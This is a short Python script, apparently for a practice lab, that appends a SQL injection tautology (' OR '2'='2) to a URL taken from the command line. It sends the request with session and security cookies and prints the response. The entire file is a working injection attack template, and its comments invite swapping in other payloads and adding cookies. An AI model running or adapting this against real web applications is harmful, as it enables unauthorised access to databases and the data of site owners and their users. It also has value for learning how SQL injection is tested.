import sys

import requests

URL = sys.argv[1]+"' OR '2'='2"  # change the sql payload 


resp = requests.get(URL, cookies={"PHPSESSID": "","security":" " })# add ur cookies
print(resp.text)
